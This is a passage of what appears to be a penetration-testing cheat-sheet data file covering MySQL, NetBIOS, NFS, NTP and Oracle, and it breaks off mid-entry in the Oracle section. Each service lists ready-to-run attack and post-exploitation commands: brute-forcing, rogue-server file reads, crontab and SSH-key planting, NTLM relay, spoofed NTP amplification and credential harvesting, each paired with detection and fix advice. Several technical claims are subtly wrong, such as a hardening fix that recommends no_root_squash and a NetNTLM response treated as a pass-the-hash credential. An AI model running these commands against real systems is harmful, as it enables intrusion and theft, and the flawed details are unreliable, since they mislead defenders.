export const services = [
  {
    slug: "mysql",
    name: "MySQL",
    port: 3306,
    protocol: "tcp",
    risk: "high",
    tags: ["database", "sql", "rdbms"],
    summary:
      "MySQL sits behind most mid-sized application stacks and it speaks a proprietary handshake before a single credential is sent. That greeting packet is a free version disclosure, and the version tells you which authentication plugin is in play and which bugs are worth your time. Empty or guessable root passwords are still common on internal hosts, and the network route to the database is frequently less protected than the application that fronts it.",
    connect: [
      {
        label: "mysql client",
        command: "mysql -h <target> -P 3306 -u <user> -p",
        detail: "Add -p on its own to be prompted for the password rather than passing it on the command line.",
      },
      {
        label: "One-shot query",
        command: "mysql -h <target> -P 3306 -u <user> -p -e 'SHOW DATABASES;'",
        detail: "The -e flag turns the client into a single command runner, which is convenient for scripted enumeration.",
      },
      {
        label: "Connection string",
        command: "mysql://<user>:<password>@<target>:3306/<database>",
        detail: "Most frameworks take this form, and the string is often what ends up in an application's configuration file.",
      },
    ],
    recon: [
      {
        title: "Version and capability probe",
        command: "nmap -sV -p 3306 --script mysql-info,mysql-variables <target>",
        detail:
          "mysql-info returns the version, the default authentication plugin and the bind address. mysql-variables adds the storage engine mix and the sql_mode settings, which tells you whether row-based tricks are on the table.",
      },
      {
        title: "Handshake banner",
        command: "nc -nv <target> 3306 < /dev/null",
        detail:
          "The server greets you before you send anything. The version string, the connection id and the authentication salt are all in that first packet, so a plain TCP read is enough to fingerprint the host.",
      },
    ],
    enumeration: [
      {
        title: "Schema inventory",
        command: "mysql -h <target> -P 3306 -u <user> -p -e 'SHOW DATABASES; SHOW TABLES FROM <database>;'",
        detail:
          "Database and table names map directly onto the application. A schema named billing, crm or vault suggests where the interesting rows live.",
      },
      {
        title: "Accounts and grants",
        command: "mysql -h <target> -P 3306 -u <user> -p -e \"SELECT user, host, plugin FROM mysql.user; SHOW GRANTS FOR CURRENT_USER();\"",
        detail:
          "The account table lists every login and its authentication plugin. SHOW GRANTS tells you what the session you already hold is actually allowed to do.",
      },
      {
        title: "NSE credential and empty-password sweep",
        command: "nmap -p 3306 --script mysql-empty-password,mysql-brute <target>",
        detail:
          "mysql-empty-password confirms the classic flaw where any account can log in with a blank password. mysql-brute tries a small wordlist and gives up quickly, which keeps the noise acceptable on a live network.",
      },
    ],
    attacks: [
      {
        title: "Weak or empty root credentials",
        severity: "high",
        command: "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>",
        detail:
          "MySQL has no connection rate limiting, so a dictionary attack runs at full speed. Root with an empty password is still regularly found on staging and developer machines.",
        detection:
          "Watch the error log for a burst of Access denied entries for one account, and alert on successful root logins from anything other than the application subnet.",
        fix: "Remove the anonymous and remote root accounts, give every application its own scoped user, and enforce a password policy with failed-login limits.",
      },
      {
        title: "Authentication bypass through a rogue MySQL server",
        severity: "critical",
        command: "python3 rogue-mysql-server.py -f /etc/passwd",
        detail:
          "If the client is configured to allow LOCAL INFILE, it will happily forward the contents of any file the server asks for. Pointing a client at a fake server turns that feature into arbitrary file read on the client machine, and the same mechanism carries files in the other direction.",
        detection:
          "Look for connections to unknown or external MySQL endpoints, and for LOAD DATA LOCAL INFILE requests originating from the database rather than the application.",
        fix: "Set local_infile=0 in my.cnf, keep the client option disabled, and make sure outbound database connections from the app tier are filtered.",
      },
      {
        title: "File write through INTO OUTFILE",
        severity: "high",
        command:
          "mysql -h <target> -P 3306 -u <user> -p -e \"SELECT '* * * * * root id > /tmp/pwn' INTO OUTFILE '/var/spool/cron/crontabs/root';\"",
        detail:
          "Any account holding the FILE privilege can write server-side files, and the path is attacker-chosen. Writing a crontab entry or a script into a web root converts a database login into code execution.",
        detection:
          "Alert on SELECT ... INTO OUTFILE and LOAD_FILE, and monitor cron directories and web roots for files that appeared without a matching deployment.",
        fix: "Drop FILE from every non-administrative account, keep the service on its own filesystem, and never let the database write into a directory that a web server serves.",
      },
    ],
    postEx: [
      {
        title: "Read arbitrary files from the server",
        severity: "high",
        command: "mysql -h <target> -P 3306 -u <user> -p -e \"SELECT LOAD_FILE('/etc/passwd');\"",
        detail:
          "LOAD_FILE needs the FILE privilege as well, but the result is a direct read of server-side paths including application configuration and key material.",
        detection:
          "LOAD_FILE calls are uncommon in production traffic. Log and alert on them the same way you alert on OUTFILE.",
        fix: "Revoke FILE except from accounts that genuinely export dumps, and isolate the database user from the host filesystem otherwise.",
      },
      {
        title: "Harvest other service credentials",
        severity: "high",
        command:
          "mysql -h <target> -P 3306 -u <user> -p -e \"SELECT user, host, authentication_string FROM mysql.user;\"",
        detail:
          "Password hashes sit in a readable table. On older servers these are weak hashes that crack offline, and they often match credentials reused on SSH, FTP or a CI system.",
        detection:
          "Queries against mysql.user from a session that is not an administrative tool should be treated as reconnaissance for lateral movement.",
        fix: "Use caching_sha2_password with strong unique passwords, restrict mysql.user reads to the DBA role, and rotate any credential that has ever been stored in an old hash format.",
      },
      {
        title: "Establish a writable foothold in a schema",
        severity: "medium",
        command:
          "mysql -h <target> -P 3306 -u <user> -p -e \"CREATE TABLE IF NOT EXISTS ops.tmp (note TEXT); INSERT INTO ops.tmp (note) VALUES ('marker');\"",
        detail:
          "A low-privilege account with write access to an application table can often be used to plant data that a scheduled job later acts on, such as a queued command or a callback URL.",
        detection:
          "Watch for inserts into tables that the application reads but does not write, and for unusual row content in job queues.",
        fix: "Give the application write access only to the tables it owns, and treat any write path into a job queue as privileged.",
      },
    ],
    commands: [
      { command: "SHOW DATABASES;", description: "Lists every schema the account can see." },
      { command: "SHOW TABLES FROM <database>;", description: "Lists tables inside a schema." },
      { command: "SELECT VERSION();", description: "Exact server version string." },
      { command: "SELECT @@version, @@hostname, @@datadir;", description: "Version, host name and data directory in one call." },
      { command: "SHOW GRANTS FOR CURRENT_USER();", description: "What the session is actually permitted to do." },
      { command: "SELECT user, host, plugin FROM mysql.user;", description: "All accounts and the authentication plugin in use." },
      { command: "SELECT LOAD_FILE('/etc/passwd');", description: "Reads a server-side file when the FILE privilege is present." },
      { command: "SELECT 'payload' INTO OUTFILE '/tmp/pwn';", description: "Writes a server-side file to a chosen path." },
      { command: "SHOW VARIABLES LIKE '%secure_file_priv%';", description: "Where file operations are permitted." },
      { command: "ALTER USER 'app'@'10.%' IDENTIFIED BY '<new-password>';", description: "Rotates the password for a scoped account." },
    ],
    hardening: [
      {
        title: "Delete the anonymous and remote root accounts",
        detail:
          "A stock install carries root accounts for localhost and for any host. Remove the remote ones and keep a single root that requires the unix socket.",
      },
      {
        title: "Bind to a private interface",
        detail:
          "Set bind-address to the internal address so the port never reaches the internet, and enforce the same boundary with a host firewall.",
      },
      {
        title: "Require TLS and verify the server certificate",
        detail:
          "ssl-mode=VERIFY_IDENTITY protects both the credentials and the data in transit, and stops a transparent proxy from quietly inserting itself.",
      },
      {
        title: "Scope every account to one schema",
        detail:
          "An application user should hold no global privileges. Separate the reporting user from the writer and from anything holding FILE.",
      },
      {
        title: "Turn off local_infile",
        detail:
          "local_infile=0 in the server configuration removes the rogue-server file read path. Most applications never use the feature.",
      },
      {
        title: "Log and alert on administrative activity",
        detail:
          "General and slow query logs should capture login attempts and any statement using OUTFILE, LOAD_FILE or the credential tables.",
      },
    ],
    tools: ["nmap", "hydra", "metasploit", "netcat", "mysql", "sqlmap"],
  },

  {
    slug: "netbios",
    name: "NetBIOS",
    port: 139,
    protocol: "tcp",
    risk: "high",
    tags: ["windows", "name-service", "legacy"],
    summary:
      "NetBIOS is the name resolution and session service that Windows networks ran on before DNS took over. It still appears on port 139 on older hosts, print servers and anything that was never decommissioned properly. The protocol broadcasts names, answers with host and workgroup details, and happily serves file and pipe sessions to clients that present no credentials at all.",
    connect: [
      {
        label: "Name resolution",
        command: "nbtstat -A <target>",
        detail: "On a Windows workstation this resolves a target and prints its NetBIOS name, workgroup and logged-on user.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 139",
        detail: "The session service greets with a small SMB negotiation packet, which confirms SMB is sitting behind the port.",
      },
      {
        label: "Share listing",
        command: "smbclient -L //<target> -N",
        detail: "The -N flag suppresses the password prompt so you can test whether the host allows a null session.",
      },
    ],
    recon: [
      {
        title: "Name and OS discovery",
        command: "nmap -p 139 --script smb-os-discovery <target>",
        detail:
          "The script reads the native LAN Manager information and reports the Windows version, the workgroup and the server name, which are often more useful than the port number itself.",
      },
      {
        title: "Name table enumeration",
        command: "nmap -sU -p 137 --script nbstat <target>",
        detail:
          "The name service runs on UDP 137, one port below the session service. Enumerating it lists every registered NetBIOS name, including the workstation service and the messaging service that discloses the logged-on user.",
      },
    ],
    enumeration: [
      {
        title: "Share and user enumeration",
        command: "nmap -p 139 --script smb-enum-shares,smb-enum-users <target>",
        detail:
          "Both scripts work over the session service when guest or anonymous access is permitted. A share called ADMIN$, C$ or print$ is a strong hint that the host accepts unauthenticated sessions.",
      },
      {
        title: "Full protocol enumeration",
        command: "enum4linux <target>",
        detail:
          "This walks the SMB tree looking for shares, users, groups and named pipes in one pass, which saves a lot of manual smbclient work.",
      },
      {
        title: "Null session test",
        command: "crackmapexec smb <target> -u '' -p '' --shares",
        detail:
          "Empty credentials against the session service show whether the guest account and the null session are both enabled. The answer decides the whole approach to this host.",
      },
    ],
    attacks: [
      {
        title: "Null session enumeration",
        severity: "high",
        command: "crackmapexec smb <target> -u '' -p '' --shares --enum-users",
        detail:
          "When the guest account is enabled, an empty username and password still produce a valid session. The attacker gets a full share list, a user list and often the contents of administrative shares without a single credential.",
        detection:
          "Event 4624 with a null logon type or the anonymous account, plus 5140 and 5145 events for shares that should never be read anonymously.",
        fix: "Set the guest account to never log on, restrict null sessions in the registry, and set Everyone and Guests to deny list and read on the administrative shares.",
      },
      {
        title: "SMB relay",
        severity: "critical",
        command: "impacket-ntlmrelayx -t <target> -smb2support -S <ip>",
        detail:
          "If the host does not require SMB signing, an intercepted authentication can be replayed to a different service. The attacker authenticates as the victim without ever knowing the password.",
        detection:
          "Event 4624 with logon type 3 from a host that is not the expected client, and 5145 events showing a share access from an unexpected source.",
        fix: "Require SMB signing on every server and client, enable SMB encryption where it is supported, and block outbound SMB from workstations.",
      },
      {
        title: "Credential capture through name resolution poisoning",
        severity: "high",
        command: "responder -I eth0 -A -t <target>",
        detail:
          "When a host prefers NetBIOS name resolution over DNS, an attacker who answers the query receives the victim's NTLM challenge-response. That response is enough to crack offline or to relay directly.",
        detection:
          "Event 4624 with logon type 3 and an unusual workstation name, plus any LLMNR or NetBIOS name request leaving a subnet where it should not.",
        fix: "Prefer DNS, disable NetBIOS name resolution on clients and servers, and require SMB signing so the response cannot be replayed.",
      },
    ],
    postEx: [
      {
        title: "Replay a captured hash",
        severity: "high",
        command: "impacket-psexec -hashes ':<hash>' <domain-user>@<target>",
        detail:
          "A captured NetNTLMv1 response works against most services that accept NTLM, including RDP, WinRM and SMB. The hash is the credential, so no cracking is required.",
        detection:
          "Event 4624 type 3 logons where the account normally uses interactive logon, and 4768/4769 ticket events from unusual workstations.",
        fix:
          "Disable NTLM wherever Kerberos is available, require SMB signing, and deploy the Protected Users policy together with the block logon using NTLM setting.",
      },
      {
        title: "Enumerate and pull shares over the null session",
        severity: "high",
        command: "smbclient //<target>/<share> -N -c 'recurse on; ls'",
        detail:
          "Shares that the anonymous session can read may hold configuration files, key material or backups that were never intended to leave the machine.",
        detection:
          "Event 5145 for the administrative shares and for any share whose access control allows the anonymous or guest identity.",
        fix: "Audit every share with access groups Everyone and Guests, remove the administrative shares from view, and require explicit permissions per share.",
      },
      {
        title: "Stage tooling through a writable share",
        severity: "high",
        command: "smbclient //<target>/<share> -U <user> -P <password> -c 'put payload.exe'",
        detail:
          "A share that accepts writes is an easy place to land a file that another process will pick up, such as a scheduled task folder or a startup directory.",
        detection:
          "Event 5145 with a write access type on shares that should be read-only, and 5140 creation events for executables.",
        fix: "Mark every share read-only unless writes are explicitly required, and monitor for executable files written to share roots.",
      },
    ],
    commands: [
      { command: "nbtstat -A <target>", description: "Resolves a host and prints its NetBIOS names and workgroup." },
      { command: "nbtstat -c", description: "Shows the local NetBIOS name cache." },
      { command: "nmap -sU -p 137 --script nbstat <target>", description: "Dumps the remote name table." },
      { command: "nmap -p 139 --script smb-os-discovery <target>", description: "Reports the operating system and server name." },
      { command: "net view \\\\target", description: "Lists shares over the session service." },
      { command: "smbclient -L //<target> -N", description: "Lists shares with no credentials supplied." },
      { command: "smbclient //<target>/<share> -U <user> -P <password>", description: "Opens a share with explicit credentials." },
      { command: "enum4linux <target>", description: "Walks shares, users, groups and named pipes in one pass." },
      { command: "crackmapexec smb <target> -u '' -p '' --shares", description: "Tests whether a null session is accepted." },
      { command: "arp -a", description: "Shows the IP to MAC mapping that supports name resolution." },
    ],
    hardening: [
      {
        title: "Remove the file and print sharing service",
        detail:
          "Server service is what listens on 139. If a host does not need to act as a file or print server, disable it and close the port.",
      },
      {
        title: "Require SMB signing",
        detail:
          "Signing is the control that makes relay impractical. Enforce it with a GPO and verify with Get-SmbServerConfiguration.",
      },
      {
        title: "Prefer DNS and disable NetBIOS",
        detail:
          "Set the node type to DNS only, then remove the NetBIOS service from the interface bindings on both clients and servers.",
      },
      {
        title: "Disable the guest account",
        detail:
          "Guest on servers should be disabled, and null session settings should block anonymous access to the pipe and share objects.",
      },
      {
        title: "Restrict SMB at the perimeter",
        detail:
          "Allow TCP 445 only from management hosts and segment networks so a workstation compromise does not automatically become a server compromise.",
      },
    ],
    tools: ["nmap", "responder", "impacket", "netexec", "enum4linux", "netcat"],
  },

  {
    slug: "nfs",
    name: "NFS",
    port: 2049,
    protocol: "tcp",
    risk: "high",
    tags: ["file-share", "unix", "storage"],
    summary:
      "NFS serves files over the network with an authorisation model that predates modern identity systems. Access is decided by the numeric UID and GID of the client, so a mismatch between the two systems silently becomes world-writable or root-owned. Export tables are frequently published without a client restriction, and the default root_squash behaviour is regularly turned off to make an administrator's life easier.",
    connect: [
      {
        label: "Export listing",
        command: "showmount -e <target>",
        detail: "Queries the mount daemon for the paths it offers. It is the fastest first check against any NFS host.",
      },
      {
        label: "Mount a share",
        command: "mount -t nfs <target>:/export /mnt/nfs",
        detail: "Add -o ro to mount read-only while you are still assessing.",
      },
      {
        label: "Registered exports",
        command: "exportfs -v",
        detail: "Run on the server to print the live export table including the option flags for each path.",
      },
    ],
    recon: [
      {
        title: "Service and export probe",
        command: "nmap -sV -p 2049 --script nfs-showmount <target>",
        detail:
          "The script queries the mount daemon over the well-known port and lists the exported paths. Read-only exports are common, which decides how much of this page still applies.",
      },
      {
        title: "RPC program map",
        command: "rpcinfo -p <target>",
        detail:
          "Lists every RPC program and version with the port it is bound to. This is how you find mountd, nfsd, rquotad and the other services that share the same host.",
      },
    ],
    enumeration: [
      {
        title: "Export table",
        command: "showmount -e <target>",
        detail:
          "The output shows the path, the client restrictions and the options. A path exported to * with no options is a finding on its own.",
      },
      {
        title: "Mount and read locally",
        command: "sudo mount -t nfs -o ro <target>:/export /mnt/nfs && ls -la /mnt/nfs",
        detail:
          "Once mounted, the directory behaves like a local folder. Ownership and permissions on the mount reflect the numeric IDs the server has for your machine.",
      },
      {
        title: "Client-side UID mapping",
        command: "id && stat -c '%u %g %n' /mnt/nfs",
        detail:
          "Compare your local UID with the numeric owner of the mounted files. When they do not match, the server has no idea who you are and defaults to the nobody mapping.",
      },
    ],
    attacks: [
      {
        title: "Exported share with root_squash disabled",
        severity: "critical",
        command: "sudo mount -t nfs -o nolock,no_root_squash <target>:/ /mnt/nfs",
        detail:
          "With root_squash off the client root is mapped to root on the server. That turns an ordinary user into the owner of any file in the export, which is a direct path to modifying startup scripts and key material.",
        detection:
          "Audit the export table for no_root_squash and for exports that reach outside the intended data path, then check for changes to files under the exported root.",
        fix: "Always keep root_squash enabled, export only the directories that are genuinely shared, and add ro to exports that are read-only in practice.",
      },
      {
        title: "Unrestricted export readable by anyone",
        severity: "high",
        command: "showmount -e <target> && ls -la /mnt/nfs",
        detail:
          "An export that lists every client and carries no write restriction usually contains home directories, backup trees or application data that was never meant to leave the machine.",
        detection:
          "Log mountd requests and look for connections from hosts outside the subnet the export was written for.",
        fix: "Restrict every export to a named subnet or host list, and enforce the restriction at the firewall as well as in the export table.",
      },
      {
        title: "Path traversal when the export is not chrooted",
        severity: "high",
        command: "rsync -av rsync://<target>/<module>/../../../../etc/ /tmp/leak/",
        detail:
          "When the daemon runs with use chroot = no, path components that climb out of the exported directory can reach the rest of the filesystem. rsync is a convenient way to walk the tree and pull what you find.",
        detection:
          "Look for mountd requests whose path contains parent directory components and for reads outside the exported subtree.",
        fix: "Set use chroot = yes, run the daemon as an unprivileged account with no login shell, and keep the exported data on its own partition.",
      },
    ],
    postEx: [
      {
        title: "Write an SSH key into a remote home directory",
        severity: "critical",
        command:
          "mkdir -p /mnt/nfs/home/<user>/.ssh && echo '<public-key>' >> /mnt/nfs/home/<user>/.ssh/authorized_keys",
        detail:
          "If the export is writable, an authorised_keys file placed in the right directory is a durable login that survives password rotation and never touches the authentication system.",
        detection:
          "Monitor for new files under .ssh directories on exported paths and for sudden key-based logins from a new source address.",
        fix: "Keep exports read-only wherever possible, apply no_root_squash, and treat any writable user home export as a critical exposure.",
      },
      {
        title: "Drop a scheduled job through a writable export",
        severity: "high",
        command: "echo '* * * * * root id > /tmp/nfs_pwn' > /mnt/nfs/var/spool/cron/crontabs/root",
        detail:
          "Cron directories under /var/spool are frequently exported to build servers. A single line written there executes as root on the next minute.",
        detection:
          "File integrity monitoring on crontab paths and on any directory that is world-writable.",
        fix: "Do not export cron or spool directories, keep crontabs read-only, and run cron with a dedicated unprivileged user where possible.",
      },
      {
        title: "Harvest keys and configuration from exported home directories",
        severity: "medium",
        command: "find /mnt/nfs -maxdepth 4 \\( -name 'id_rsa' -o -name '*.pem' -o -name '.aws' -o -name 'credentials' \\) 2>/dev/null",
        detail:
          "Home directories are the usual place where private keys and cloud credentials are left in readable files. A read-only mount is enough to collect them.",
        detection:
          "Look for bulk reads across an export, particularly reads that touch .ssh, .aws and .config directories.",
        fix: "Do not export home directories, keep private keys in a managed store, and scope NFS access to dedicated service accounts.",
      },
    ],
    commands: [
      { command: "showmount -e <target>", description: "Lists the paths the server exports." },
      { command: "rpcinfo -p <target>", description: "Maps RPC programs to the ports they use." },
      { command: "mount -t nfs -o ro <target>:/export /mnt/nfs", description: "Mounts an export read-only for inspection." },
      { command: "findmnt -t nfs", description: "Shows every NFS mount currently on the machine." },
      { command: "nfsstat -m", description: "Per-mount NFS statistics and options." },
      { command: "exportfs -v", description: "Prints the server's export table with its options." },
      { command: "stat -c '%u %g %a %n' /mnt/nfs/file", description: "Shows the numeric owner and permissions of a mounted file." },
      { command: "getfacl /mnt/nfs/share", description: "Displays the full access control list of a path." },
      { command: "cat /etc/fstab", description: "Lists the mounts configured to survive a reboot." },
      { command: "umount /mnt/nfs", description: "Removes a mount when the inspection is finished." },
    ],
    hardening: [
      {
        title: "Keep root_squash enabled",
        detail:
          "The default maps client root to nobody. Turning it off is the single most consequential change an administrator can make to an NFS server.",
      },
      {
        title: "Restrict exports to named clients",
        detail:
          "Write the allowed hosts or subnets into /etc/exports for every path, and remember that the file is read literally, so a stray space changes the rule.",
      },
      {
        title: "Mount read-only unless writes are required",
        detail:
          "Add ro to the options for anything that is not genuinely a shared working directory. It removes an entire class of post-exploitation options.",
      },
      {
        title: "Use NFSv4 with Kerberos",
        detail:
          "NFSv4 centralises the export list, supports a single well-known port and can rely on a real identity backend instead of numeric UID matching.",
      },
      {
        title: "Keep rpcbind off the network",
        detail:
          "Nothing needs to reach port 111 from outside the server segment. Filter it and 2049 to the hosts that mount the shares.",
      },
      {
        title: "Run the daemon unprivileged",
        detail:
          "Give the NFS service account no shell, no home directory and no privilege beyond the export, so a traversal bug cannot reach the rest of the host.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "netexec", "rsync"],
  },

  {
    slug: "ntp",
    name: "NTP",
    port: 123,
    protocol: "udp",
    risk: "medium",
    tags: ["time-sync", "udp", "infrastructure"],
    summary:
      "NTP keeps the clocks on a network roughly in step, and the protocol is older and far less careful than most people assume. It runs over UDP with no built-in authentication, and mode 6 and mode 7 packets can return a list of every client that has contacted the server. That list alone describes the shape of the network, and a spoofed time source can quietly shift clocks across an entire estate.",
    connect: [
      {
        label: "Time query",
        command: "sntp -d <ip> 123",
        detail: "Prints the offset between the local clock and the server, which is also a clean confirmation that the service is alive.",
      },
      {
        label: "freeradius-client probe",
        command: "ntpdate -q <target>",
        detail: "The -q flag queries the server and reports the offset without changing the local clock.",
      },
      {
        label: "Raw request",
        command: "printf '\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1d\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' | nc -u -nv <target> 123",
        detail: "A mode 3 client packet written by hand, useful when no NTP client is installed.",
      },
    ],
    recon: [
      {
        title: "Service and mode 6 probe",
        command: "nmap -sU -p 123 --script ntp-info,ntp-monlist <target>",
        detail:
          "ntp-info reports the version, the stratum and the reference clock. ntp-monlist asks the server for the client list, and a server that answers it is running an old implementation with mode 6 and mode 7 enabled.",
      },
      {
        title: "Timing baseline",
        command: "sntp -d <ip> 123",
        detail:
          "A large offset against a host that should be on the same network segment is often the first sign that the server is being spoofed or has been moved.",
      },
    ],
    enumeration: [
      {
        title: "Client list through mode 6",
        command: "nmap -sU -p 123 --script ntp-monlist <target>",
        detail:
          "The response lists addresses that have contacted the server recently. On a shared server that list can include hosts no other service has revealed.",
      },
      {
        title: "Server variables",
        command: "nmap -sU -p 123 --script ntp-info <target>",
        detail:
          "The returned variables include the stratum, the poll interval, the leap indicator and the server's identifier, which is usually its address or hostname.",
      },
      {
        title: "Packet capture of the exchange",
        command: "tcpdump -i eth0 -n -s 0 -X udp port 123",
        detail:
          "Reading the packets shows exactly which mode and version the server accepts and how it answers, which matters more than the version banner suggests.",
      },
    ],
    attacks: [
      {
        title: "Monlist response used for reflection",
        severity: "high",
        command: "nmap -sU -p 123 --script ntp-monlist <target>",
        detail:
          "A server that answers mode 6 and mode 7 can return a response many times larger than the request. Spoofing the source address turns it into an amplifier, and the target of the amplification is an innocent third party.",
        detection:
          "A sudden rise in large UDP responses on port 123 and a matching rise in inbound traffic to the reflection victim are the visible signs.",
        fix: "Upgrade to a current NTP release, disable mode 6 and mode 7 with mode 6 noquery and mode 7 noquery, and drop UDP 123 from the internet entirely.",
      },
      {
        title: "Spoofed time source",
        severity: "high",
        command: "bettercap -eval 'set ntp.time.target <target>; set ntp.time.offset -3600; ntp.time poison on'",
        detail:
          "A client that accepts a time response from an unauthenticated source can be moved by minutes or hours. Kerberos tickets, log correlation, certificate validity checks and scheduled jobs all depend on the clock being right.",
        detection:
          "Compare the local clock with a trusted source over time, and watch for NTP responses arriving from addresses that are not on the configured server list.",
        fix: "Enable NTS or symmetric authentication, restrict mode 6 and mode 7, and monitor the offset between clients and the authoritative source.",
      },
      {
        title: "UDP amplification as a reflection source",
        severity: "medium",
        command: "hping3 --udp -p 123 -c 1 -a <victim-ip> <target>",
        detail:
          "With the source address spoofed, the response is delivered to the victim rather than to you. This is the mechanism behind most NTP-based amplification reports.",
        detection:
          "Look for outbound UDP 123 traffic with a source address that is not a local interface, which is impossible without spoofing.",
        fix: "Apply egress filtering on UDP 123 so the host cannot send packets with a forged source address.",
      },
    ],
    postEx: [
      {
        title: "Map the internal network from the client list",
        severity: "medium",
        command: "nmap -sU -p 123 --script ntp-monlist <target> | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u",
        detail:
          "The list of clients often includes hosts that are not otherwise exposed or that sit on management networks. It is a free map of who talks to whom.",
        detection:
          "Repeated mode 6 requests from a single source are unusual and worth logging at the server.",
        fix: "Disable the monlist response entirely with mode 6 noquery and mode 7 noquery.",
      },
      {
        title: "Break Kerberos and certificate validation with a skewed clock",
        severity: "high",
        command: "sntp -d <ip> 123",
        detail:
          "A clock that is more than a few minutes out causes Kerberos tickets to fail, TLS certificates to look expired and log correlation to fall apart. On a large estate a small offset is enough to disrupt authentication on purpose.",
        detection:
          "A spike in Kerberos clock skew errors and TLS certificate validity failures across multiple hosts points at the time source.",
        fix: "Use NTS or symmetric key authentication, monitor skew as a first-class alert and keep an accurate source on a trusted network.",
      },
      {
        title: "Corrupt log timelines during an incident",
        severity: "medium",
        command: "ntpdate -q -d <target>",
        detail:
          "Moving the clock on a compromised host makes the local logs disagree with the collector's timeline, which is a cheap and effective way to waste an investigation.",
        detection:
          "Compare host time against the collector's time and alert on offsets beyond a couple of seconds.",
        fix: "Synchronise hosts from authenticated sources and alert on drift, and keep the log collector's clock on a separate trustworthy path.",
      },
    ],
    commands: [
      { command: "sntp -d <ip> 123", description: "Reports the offset between the local clock and the server." },
      { command: "ntpdate -q <target>", description: "Queries the server without changing the local clock." },
      { command: "ntpdate -q <target> iburst", description: "Burst correction for a host that has been offline." },
      { command: "nmap -sU -p 123 --script ntp-info <target>", description: "Reads the server version, stratum and reference clock." },
      { command: "nmap -sU -p 123 --script ntp-monlist <target>", description: "Asks for the list of clients that contacted the server." },
      { command: "ntpq -p", description: "Shows the local peer list and each peer's offset." },
      { command: "chronyc sources -v", description: "Alternative client view of the configured time sources." },
      { command: "chronyc tracking", description: "Reports the current system clock offset and frequency." },
      { command: "tcpdump -i eth0 -n -s 0 -X udp port 123", description: "Captures the raw NTP exchange for inspection." },
      { command: "ntpstat", description: "One-line offset summary against the selected peer." },
    ],
    hardening: [
      {
        title: "Upgrade the daemon",
        detail:
          "Current NTP implementations disable the dangerous modes by default and fix the reflection issues that old builds carry.",
      },
      {
        title: "Disable mode 6 and mode 7 queries",
        detail:
          "Add mode 6 noquery and mode 7 noquery to the server configuration and reload. This removes the amplification surface in one line.",
      },
      {
        title: "Restrict the service to the network",
        detail:
          "Filter UDP 123 so only internal servers can reach it, and block it outright at the internet edge.",
      },
      {
        title: "Authenticate the time source",
        detail:
          "NTS gives you encrypted and authenticated time. Where symmetric keys are already in place, use them instead of trusting the source address alone.",
      },
      {
        title: "Run more than one source",
        detail:
          "Two or three independent sources on separate networks make spoofing harder, because an attacker would have to fool every candidate at once.",
      },
      {
        title: "Watch the offset",
        detail:
          "Alert when the offset against the reference sources grows beyond a threshold. A sudden jump is often the earliest indication of interference.",
      },
    ],
    tools: ["nmap", "netcat", "tshark", "bettercap", "metasploit"],
  },

  {
    slug: "oracle",
    name: "Oracle",
    port: 1521,
    protocol: "tcp",
    risk: "high",
    tags: ["database", "sql", "rdbms"],
    summary:
      "Oracle Database runs behind the TNS listener, a protocol that is old enough to have its own catalogue of authentication problems. The listener gives up its version and the service names it hosts before any login is attempted, and it keeps running even when the database instance behind it has been stopped. Default installation accounts like SCOTT and the shared password hashes in the data dictionary make the first stage of an attack surprisingly cheap.",
    connect: [
      {
        label: "SQL*Plus",
        command: "sqlplus <user>/<password>@<target>:1521/<service_name>",
        detail: "The service name comes from the listener enumeration, so run that first if you do not already know it.",
      },
      {
        label: "EZConnect string",
        command: "sqlplus <user>/<password>@//<target>:1521/<service_name>",
        detail: "The double slash form avoids the need for a TNS alias in the client configuration.",
      },
      {
        label: "Listener query",
        command: "lsnrctl status",
        detail: "Run against the host itself to read the local listener configuration and the services it advertises.",
      },
    ],
    recon: [
      {
        title: "Listener fingerprinting",
        command: "nmap -sV -p 1521 --script oracle-tns-version <target>",
        detail:
          "The script talks the TNS handshake and returns the listener version. Older listeners on 10g and 11g are the ones with publicly documented remote code execution bugs, so the version decides what to try.",
      },
      {
        title: "Service name enumeration",
        command: "nmap -p 1521 --script oracle-sid-get <target>",
        detail:
          "The script asks the listener for the instance identifiers it hosts. Each name is a candidate database and each one is a separate login target.",
      },
    ],
    enumeration: [
      {
        title: "Instance identifiers",
        command: "nmap -p 1521 --script oracle-sid-get <target>",
        detail:
          "A host often hosts several instances such as ORCL, XE and a reporting clone. Missing one means missing an entire set of data.",
      },
      {
        title: "Database and account listing",
        command:
          "sqlplus <user>/<password>@<target>:1521/<service_name> -e 'SELECT name FROM v$database; SELECT username, account_status FROM dba_users;'",
        detail:
          "v$database confirms which instance you reached and dba_users lists the accounts with their status. The account status column shows locked accounts and expired passwords, which narrows the target list.",
      },
      {
        title: "Listener services",
        command: "lsnrctl services",
        detail:
          "The local listener lists each service, its SID and its status, including instances that are registered but not currently open for business.",
      },
    ],
    attacks: [
      {
        title: "Weak or default account credentials",
        severity: "high",
        command: "hydra -l scott -P /usr/share/wordlists/rockyou.txt oracle://<target>",
        detail:
          "Sample schemas such as SCOTT and the older HR and OE accounts ship with documented passwords and are frequently left in place after a restore from an old dump.",
        detection:
          "Watch the listener and instance logs for repeated authentication failures and for successful logins to sample schemas.",
        fix: "Drop the sample schemas, give every application its own schema and account, and enforce a strong password verification function through a profile.",
      },
      {
        title: "Command execution through a PL/SQL function",
        severity: "critical",
        command:
          "sqlplus <user>/<password>@<target>:1521/<service_name> <<EOF\nCREATE OR REPLACE FUNCTION sys.run_cmd(p_in VARCHAR2) RETURN INT AS\nPRAGMA AUTONOMOUS_TRANSACTION;\nBEGIN EXECUTE IMMEDIATE p_in; RETURN 0; END;\n/\nEOF",
        detail:
          "PL/SQL with an autonomous transaction can shell out through EXECUTE IMMEDIATE. An account with CREATE PROCEDURE privilege is enough to build a small command execution primitive without touching the operating system directly.",
        detection:
          "Alert on CREATE PROCEDURE and CREATE FUNCTION by non-administrative accounts, and on the presence of an autonomous transaction in business schemas.",
        fix: "Remove CREATE PROCEDURE from application roles, restrict EXECUTE on UTL_* and DBMS_SCHEDULER packages, and review the profile of every account that can create code.",
      },
      {
        title: "Offline cracking of stored password hashes",
        severity: "high",
        command:
